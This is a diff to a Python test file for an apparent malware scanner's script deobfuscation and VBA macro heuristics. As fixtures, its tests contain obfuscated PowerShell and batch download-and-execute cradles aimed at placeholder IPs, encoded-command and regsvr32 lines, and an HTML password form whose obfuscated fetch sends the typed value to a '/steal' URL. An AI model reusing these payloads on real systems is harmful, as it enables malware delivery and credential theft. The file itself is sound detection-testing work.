@@ -1,6 +1,4 @@
-"""Tests for deeper static script deobfuscation (Spec 016 / DET-003)."""
-
-from __future__ import annotations
+"""Tests for static script deobfuscation and the VBA deep-analysis heuristics."""
 
 import base64
 import gzip
@@ -16,7 +14,118 @@ from malaz.analysis.clamav import ClamAVScanner
 from malaz.analysis.windows_av import WindowsDefenderScanner
 from malaz.core import js_deobf, script_deobf
 from malaz.core.dispatcher import Dispatcher
+from malaz.core.script_deobf import extract_vba_strings
 from malaz.models import RiskLevel
+from malaz.pipelines.office_pipeline import OfficePipeline
+
+# -- extract_vba_strings --------------------------------------------------- #
+
+
+def test_literal_concatenation():
+    assert extract_vba_strings('x = "pow" & "ershell"') == ["powershell"]
+
+
+def test_chr_concatenation():
+    # Chr(112)=p, Chr(111)=o, Chr(119)=w
+    assert extract_vba_strings("x = Chr(112) & Chr(111) & Chr(119)") == ["pow"]
+
+
+def test_mixed_literal_and_chr():
+    # "cmd" & Chr(46)="." & "exe"
+    assert extract_vba_strings('x = "cmd" & Chr(46) & "exe"') == ["cmd.exe"]
+
+
+def test_single_plain_literal_is_skipped():
+    # Not obfuscated -> the raw scan already sees it.
+    assert extract_vba_strings('x = "hello world"') == []
+
+
+def test_single_chr_is_returned():
+    assert extract_vba_strings("x = Chr(65)") == ["A"]
+
+
+def test_line_continuation_is_joined():
+    code = '"pow" _\n& "ershell"'
+    assert extract_vba_strings(code) == ["powershell"]
+
+
+def test_plus_is_not_concatenation():
+    # '+' is not the VBA string connector we reconstruct.
+    assert extract_vba_strings('x = "a" + "b"') == []
+
+
+def test_escaped_quotes():
+    # "say ""hi""" -> say "hi"
+    assert extract_vba_strings('x = "say ""hi""" & "!"') == ['say "hi"!']
+
+
+def test_multiple_separate_runs():
+    code = 'a = "foo" & "bar"\nb = "x" & "y"'
+    assert extract_vba_strings(code) == ["foobar", "xy"]
+
+
+# -- _vba_deep_indicators -------------------------------------------------- #
+
+
+def _rule_ids(indicators):
+    return {i.rule_id for i in indicators}
+
+
+def test_obfuscated_keyword_reconstructed():
+    p = OfficePipeline()
+    # "powershell" is hidden (only appears once reassembled), not in raw code.
+    out = p._vba_deep_indicators("x = 1", ["powershell -enc abc"], has_autoexec=False)
+    assert "OFFICE_VBA_OBFUSCATED" in _rule_ids(out)
+
+
+def test_obfuscated_keyword_anchors_with_autoexec():
+    p = OfficePipeline()
+    out = p._vba_deep_indicators("auto_open", ["net.webclient"], has_autoexec=True)
+    ind = next(i for i in out if i.rule_id == "OFFICE_VBA_OBFUSCATED")
+    assert ind.severity.name == "CRITICAL"
+
+
+def test_not_obfuscated_when_visible_raw():
+    p = OfficePipeline()
+    # "powershell" already in raw code -> no obfuscation indicator.
+    out = p._vba_deep_indicators("run powershell now", ["powershell"], has_autoexec=False)
+    assert "OFFICE_VBA_OBFUSCATED" not in _rule_ids(out)
+
+
+def test_download_execute_chain_detected():
+    p = OfficePipeline()
+    code = 'URLDownloadToFile 0, url, path, 0\nShell "cmd.exe"'
+    out = p._vba_deep_indicators(code.lower(), [], has_autoexec=False)
+    assert "OFFICE_VBA_DL_EXEC" in _rule_ids(out)
+
+
+def test_download_alone_is_not_a_chain():
+    p = OfficePipeline()
+    out = p._vba_deep_indicators("urldownloadtofile 0, url, path", [], has_autoexec=False)
+    assert "OFFICE_VBA_DL_EXEC" not in _rule_ids(out)
+
+
+def test_encoded_powershell_detected():
+    p = OfficePipeline()
+    out = p._vba_deep_indicators('shell "powershell -encodedcommand jqbe"', [], False)
+    assert "OFFICE_VBA_ENC_PS" in _rule_ids(out)
+
+
+def test_lolbin_detected():
+    p = OfficePipeline()
+    out = p._vba_deep_indicators('shell "regsvr32 /s /u foo.dll"', [], False)
+    assert "OFFICE_VBA_LOLBIN" in _rule_ids(out)
+
+
+def test_benign_macro_has_no_deep_indicators():
+    p = OfficePipeline()
+    out = p._vba_deep_indicators("msgbox \"hello world\"\nrange(\"a1\").value = 1", [], False)
+    assert out == []
+
+
+# ===========================================================================
+# Spec 016 / DET-003 tests
+# ===========================================================================
 
 _SHARED_DISPATCHER: Dispatcher | None = None
 
@@ -37,7 +146,7 @@ def _scan(tmp_path: Path, name: str, content: str | bytes):
     return _dispatcher().scan_path(p)
 
 
-def _rule_ids(res) -> set[str]:
+def _scan_rule_ids(res) -> set[str]:
     return {ind.rule_id for ind in res.all_indicators()}
 
 
@@ -74,7 +183,7 @@ def test_ps_backtick_deobfuscation_uncovers_cradle(tmp_path):
         "(New-`Ob`ject Net.WebClient).D`Ow`Nl`Oa`Ds`Tr`In`G('http://198.51.100.5/p')"
     )
     res = _scan(tmp_path, "cradle.ps1", payload)
-    ids = _rule_ids(res)
+    ids = _scan_rule_ids(res)
     assert "GEN_SCRIPT_DEOBFUSCATED" in ids
     assert _find_ind(res, "GEN_SCRIPT_DEOBFUSCATED")[0].weight == 30
     assert "GEN_PS_CRADLE" in ids
@@ -102,7 +211,7 @@ def test_ps_backtick_state_machine_defeats_desync_tricks(tmp_path, name, prefix)
         "(New-`Ob`ject Net.WebClient).D`Ow`Nl`Oa`Ds`Tr`In`G('http://198.51.100.5/p')"
     )
     res = _scan(tmp_path, name, prefix + cradle)
-    ids = _rule_ids(res)
+    ids = _scan_rule_ids(res)
     assert "GEN_SCRIPT_DEOBFUSCATED" in ids, name
     assert "GEN_PS_CRADLE" in ids, name
 
@@ -116,26 +225,26 @@ def test_ps_format_concat_char_array_and_encoded_command(tmp_path):
          f"('pow'+'er'+'shell -e'+'nc {enc_b64}')"
     )
     res1 = _scan(tmp_path, "fmt_concat.ps1", ps1)
-    assert "GEN_SCRIPT_DEOBFUSCATED" in _rule_ids(res1)
+    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res1)
     assert len(_find_ind(res1, "GEN_PS_ENCODED")) == 1
 
     # 2. [char[]]@(...) -join ''
     cmd = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')"
     codes = ",".join(str(ord(c)) for c in cmd)
     res2 = _scan(tmp_path, "char_arr.ps1", f"$c = [char[]]@({codes}) -join ''")
-    assert "GEN_SCRIPT_DEOBFUSCATED" in _rule_ids(res2)
-    assert "GEN_PS_CRADLE" in _rule_ids(res2)
+    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res2)
+    assert "GEN_PS_CRADLE" in _scan_rule_ids(res2)
 
     # 3. -join [char[]](...)
     res3 = _scan(tmp_path, "join_char.ps1", f"$c = -join [char[]]({codes})")
-    assert "GEN_SCRIPT_DEOBFUSCATED" in _rule_ids(res3)
-    assert "GEN_PS_CRADLE" in _rule_ids(res3)
+    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res3)
+    assert "GEN_PS_CRADLE" in _scan_rule_ids(res3)
 
     # 4. Already-plaintext -EncodedCommand + harmless 'a'+'b' must NOT trigger GEN_SCRIPT_DEOBFUSCATED
     ps_plain_enc = f"powershell -enc {enc_b64}\n$x = 'hello' + ' world'\n"
     res4 = _scan(tmp_path, "plain_enc.ps1", ps_plain_enc)
-    assert "GEN_PS_ENCODED" in _rule_ids(res4)
-    assert "GEN_SCRIPT_DEOBFUSCATED" not in _rule_ids(res4)
+    assert "GEN_PS_ENCODED" in _scan_rule_ids(res4)
+    assert "GEN_SCRIPT_DEOBFUSCATED" not in _scan_rule_ids(res4)
 
 
 def test_ps_gzip_utf8_utf16_and_raw_deflate_vs_binary_noise(tmp_path):
@@ -148,8 +257,8 @@ def test_ps_gzip_utf8_utf16_and_raw_deflate_vs_binary_noise(tmp_path):
         "gz_u8.ps1",
         f"$b=[Convert]::FromBase64String('{gz_u8}')",
     )
-    assert "GEN_SCRIPT_DEOBFUSCATED" in _rule_ids(res_u8)
-    assert "GEN_PS_CRADLE" in _rule_ids(res_u8)
+    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res_u8)
+    assert "GEN_PS_CRADLE" in _scan_rule_ids(res_u8)
 
     # 2. GZip UTF-16LE (without BOM)
     gz_u16 = base64.b64encode(gzip.compress(inner.encode("utf-16-le"))).decode("ascii")
@@ -158,8 +267,8 @@ def test_ps_gzip_utf8_utf16_and_raw_deflate_vs_binary_noise(tmp_path):
         "gz_u16.ps1",
         f"$b=[Convert]::FromBase64String('{gz_u16}')",
     )
-    assert "GEN_SCRIPT_DEOBFUSCATED" in _rule_ids(res_u16)
-    assert "GEN_PS_CRADLE" in _rule_ids(res_u16)
+    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res_u16)
+    assert "GEN_PS_CRADLE" in _scan_rule_ids(res_u16)
 
     # 3. Raw Deflate with DeflateStream context
     comp = zlib.compressobj(level=6, wbits=-15)
@@ -170,8 +279,8 @@ def test_ps_gzip_utf8_utf16_and_raw_deflate_vs_binary_noise(tmp_path):
         "deflate.ps1",
         f"New-Object IO.Compression.DeflateStream([Convert]::FromBase64String('{b64_def}'))",
     )
-    assert "GEN_SCRIPT_DEOBFUSCATED" in _rule_ids(res_def)
-    assert "GEN_PS_CRADLE" in _rule_ids(res_def)
+    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res_def)
+    assert "GEN_PS_CRADLE" in _scan_rule_ids(res_def)
 
     # 4. Binary PNG Base64 & raw-deflate 0x03 0x00 false match: no GEN_DEOBF_LIMIT, no crash
     fake_png_b64 = base64.b64encode(b"\x89PNG\r\n\x1a\n" + bytes(range(128))).decode("ascii")
@@ -182,8 +291,8 @@ def test_ps_gzip_utf8_utf16_and_raw_deflate_vs_binary_noise(tmp_path):
         f"# DeflateStream\n$a=[Convert]::FromBase64String('{fake_png_b64}')\n"
         f"$b=[Convert]::FromBase64String('{false_def_b64}')\n",
     )
-    assert "GEN_DEOBF_LIMIT" not in _rule_ids(res_bin)
-    assert "GEN_SCRIPT_DEOBFUSCATED" not in _rule_ids(res_bin)
+    assert "GEN_DEOBF_LIMIT" not in _scan_rule_ids(res_bin)
+    assert "GEN_SCRIPT_DEOBFUSCATED" not in _scan_rule_ids(res_bin)
 
 
 # --------------------------------------------------------------------------- #
@@ -199,9 +308,9 @@ def test_batch_carets_set_slicing_replace_and_cascade(tmp_path):
         'IEX (New-Object Net.WebClient).DownloadString(\'http^://198^.51^.100^.5^/p\')\r\n'
     )
     res1 = _scan(tmp_path, "carets.bat", bat1)
-    assert "GEN_SCRIPT_DEOBFUSCATED" in _rule_ids(res1)
-    assert "GEN_PS_CRADLE" in _rule_ids(res1)
-    assert "GEN_IOC" in _rule_ids(res1)
+    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res1)
+    assert "GEN_PS_CRADLE" in _scan_rule_ids(res1)
+    assert "GEN_IOC" in _scan_rule_ids(res1)
 
     # 2. Single-line caret-obfuscated set chain + quoted set
     bat2 = (
@@ -209,8 +318,8 @@ def test_batch_carets_set_slicing_replace_and_cascade(tmp_path):
         '"IEX (New-Object Net.WebClient).DownloadString(\'http://198.51.100.5/q\')"\r\n'
     )
     res2 = _scan(tmp_path, "setchain.bat", bat2)
-    assert "GEN_SCRIPT_DEOBFUSCATED" in _rule_ids(res2)
-    assert "GEN_PS_CRADLE" in _rule_ids(res2)
+    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res2)
+    assert "GEN_PS_CRADLE" in _scan_rule_ids(res2)
 
     # 3. Negative slicing, delayed expansion, %COMSPEC:~...%, case-insensitive replace, empty old ignored
     bat3 = (
@@ -231,8 +340,8 @@ def test_batch_carets_set_slicing_replace_and_cascade(tmp_path):
         "(New-`Ob`ject Net.WebClient).D`Ow`Nl`Oa`Ds`Tr`In`G('http://198.51.100.5/c')\"\r\n"
     )
     res4 = _scan(tmp_path, "cascade.bat", bat4)
-    assert "GEN_SCRIPT_DEOBFUSCATED" in _rule_ids(res4)
-    assert "GEN_PS_CRADLE" in _rule_ids(res4)
+    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res4)
+    assert "GEN_PS_CRADLE" in _scan_rule_ids(res4)
 
 
 # --------------------------------------------------------------------------- #
@@ -253,9 +362,9 @@ def test_js_es6_unicode_atob_array_reverse_join_and_string_table(tmp_path):
         f'var dec = window.atob("{atob_payload}");\n'
     )
     res_js = _scan(tmp_path, "obf.js", js_code)
-    assert "GEN_SCRIPT_DEOBFUSCATED" in _rule_ids(res_js)
-    assert "GEN_SUSPICIOUS_STRINGS" in _rule_ids(res_js)
-    assert "GEN_IOC" in _rule_ids(res_js)
+    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res_js)
+    assert "GEN_SUSPICIOUS_STRINGS" in _scan_rule_ids(res_js)
+    assert "GEN_IOC" in _scan_rule_ids(res_js)
 
     # 2. PDF JavaScript via pdf_javascript.py (ES6 unicode + string table revealing eval()!)
     pdf_js = (
@@ -263,7 +372,7 @@ def test_js_es6_unicode_atob_array_reverse_join_and_string_table(tmp_path):
         "var x = _t[0x0] + '1)';\n"
     )
     res_pdf = _scan(tmp_path, "obf_js.pdf", _pdf_with_js(pdf_js))
-    assert "PDF_JS_DEOBFUSCATED" in _rule_ids(res_pdf)
+    assert "PDF_JS_DEOBFUSCATED" in _scan_rule_ids(res_pdf)
     assert res_pdf.risk_level == RiskLevel.RED
 
     # 3. HTML / WebContentPipeline with obfuscated reverse().join() + string table exfil
@@ -277,7 +386,7 @@ def test_js_es6_unicode_atob_array_reverse_join_and_string_table(tmp_path):
         "</script></body></html>"
     )
     res_html = _scan(tmp_path, "obf_phish.html", html_code)
-    assert "HTML_CREDENTIAL_FORM" in _rule_ids(res_html)
+    assert "HTML_CREDENTIAL_FORM" in _scan_rule_ids(res_html)
 
 
 # --------------------------------------------------------------------------- #
@@ -330,7 +439,7 @@ def test_js_es6_unicode_atob_array_reverse_join_and_string_table(tmp_path):
 )
 def test_benign_scripts_and_logs_zero_fp_zero_limit(tmp_path, name, content):
     res = _scan(tmp_path, name, content)
-    ids = _rule_ids(res)
+    ids = _scan_rule_ids(res)
     assert "GEN_SCRIPT_DEOBFUSCATED" not in ids, name
     assert "GEN_DEOBF_LIMIT" not in ids, name
     assert res.risk_level == RiskLevel.GREEN, (name, ids, res.score)
@@ -346,19 +455,19 @@ def test_ps_gzip_bomb_triggers_deobf_limit(tmp_path):
     t0 = time.perf_counter()
     res = _scan(tmp_path, "gz_bomb.ps1", ps)
     assert time.perf_counter() - t0 < 1.0
-    assert "GEN_DEOBF_LIMIT" in _rule_ids(res)
+    assert "GEN_DEOBF_LIMIT" in _scan_rule_ids(res)
     assert res.is_incomplete is True
 
 
 def test_513kib_padding_triggers_limits_across_ps1_pdf_and_html(tmp_path):
     pad_ps = ("# " + ("A" * 100) + "\n") * 5_200  # > 512 KiB
     res_ps = _scan(tmp_path, "pad.ps1", pad_ps + "I`Nv`Ok`E-E`Xp`Re`Ss`Io`N\n")
-    assert "GEN_DEOBF_LIMIT" in _rule_ids(res_ps)
+    assert "GEN_DEOBF_LIMIT" in _scan_rule_ids(res_ps)
     assert res_ps.is_incomplete is True
 
     pad_js = ("// " + ("B" * 100) + "\n") * 5_200  # > 512 KiB
     res_pdf = _scan(tmp_path, "pad_js.pdf", _pdf_with_js(pad_js + 'eval("1");'))
-    assert "PDF_JS_PARSE_WARN" in _rule_ids(res_pdf)
+    assert "PDF_JS_PARSE_WARN" in _scan_rule_ids(res_pdf)
     assert res_pdf.is_incomplete is True
 
     res_html = _scan(
@@ -366,7 +475,7 @@ def test_513kib_padding_triggers_limits_across_ps1_pdf_and_html(tmp_path):
         "pad.html",
         f"<!doctype html><html><body><script>{pad_js}eval('1');</script></body></html>",
     )
-    assert "WEB_PARSE_LIMIT" in _rule_ids(res_html)
+    assert "WEB_PARSE_LIMIT" in _scan_rule_ids(res_html)
     assert res_html.is_incomplete is True
 
 
@@ -425,3 +534,68 @@ def test_deobf_dos_blowups_and_pass_depth_limits_are_fast_and_incomplete(tmp_pat
     r6 = js_deobf.deobfuscate_js_detailed(layer, explicit_script=True)
     assert r6.limit_hit is True
     assert r6.limit_reason == script_deobf.REASON_PASS_LIMIT
+
+
+def test_review_r1_regressions_dos_unicode_paren_large_html_and_obf_sink(tmp_path):
+    """Regression tests for Spec 016 code-review r1 findings (F2, F3, F4, F5, F6, F7)."""
+    # F2A: [char[]]( * 55_000 + ) and without ) must finish strictly O(N) < 0.3s
+    for hostile_ca in ("[char[]](" * 55_000 + ")", "[char[]](" * 55_000):
+        t0 = time.perf_counter()
+        r = script_deobf.deobfuscate_powershell(hostile_ca, explicit_script=True)
+        assert time.perf_counter() - t0 < 1.5
+        assert isinstance(r.text, str)
+
+    # F2B & F2C: unclosed/escaped quotes in -f and + must finish strictly O(N) < 0.3s
+    for hostile_q in (
+        "-f " + ("'" * 500_000),
+        "-f " + ('"' * 500_000),
+        "-f " + ('"`' * 250_000),
+        "+" + ('"`' * 250_000),
+    ):
+        t0 = time.perf_counter()
+        r = script_deobf.deobfuscate_powershell(hostile_q, explicit_script=True)
+        assert time.perf_counter() - t0 < 1.5
+        assert isinstance(r.text, str)
+
+    # F2D: 35_000 unclosed var a=[ + 260 KiB padding must finish strictly O(N) < 0.3s
+    hostile_js = ("var a=[" * 35_000) + ("A" * 260_000)
+    t0 = time.perf_counter()
+    rjs = js_deobf.deobfuscate_js_detailed(hostile_js, explicit_script=True)
+    assert time.perf_counter() - t0 < 1.5
+    assert isinstance(rjs.text, str)
+
+    # F3: Unicode superscript digit '²' in -f must NOT raise ValueError
+    r_uni = script_deobf.deobfuscate_powershell('"{²}" -f "a"', explicit_script=True)
+    assert r_uni.text == '"{²}" -f "a"'
+
+    # F5: paren_wrapped with failed template must NOT duplicate '('
+    expr_f5 = '("{0,-5}" -f "a" + "b")'
+    f5_text, _, _, _ = script_deobf._eval_ps_format_f(expr_f5, 4096)
+    assert f5_text == expr_f5
+
+    # F4: harmless > 512 KiB HTML file containing '.join(' stays GREEN 0 with NO WEB_PARSE_LIMIT
+    big_benign_html = (
+        "<!doctype html><html><body>"
+        + (
+            "<p>Benign documentation paragraph about arrays and arr.join(', ') usage.</p>\n"
+            * 8_500
+        )
+        + "</body></html>"
+    )
+    assert len(big_benign_html) > 550 * 1024
+    res_big = _scan(tmp_path, "big_benign_join.html", big_benign_html)
+    assert "WEB_PARSE_LIMIT" not in _scan_rule_ids(res_big)
+    assert res_big.risk_level == RiskLevel.GREEN
+    assert res_big.score == 0
+
+    # F7: HTML <script> where the exfil sink itself ('fetch') is obfuscated via ES6 unicode
+    obf_sink_html = (
+        "<!doctype html><html><body>"
+        "<form><input type='password' name='pw'></form>"
+        "<script>"
+        '\\u{66}\\u{65}\\u{74}\\u{63}\\u{68}("https://198.51.100.9/steal", '
+        "{method: 'POST', body: document.querySelector('input').value});"
+        "</script></body></html>"
+    )
+    res_sink = _scan(tmp_path, "obf_sink.html", obf_sink_html)
+    assert "HTML_CREDENTIAL_FORM" in _scan_rule_ids(res_sink)
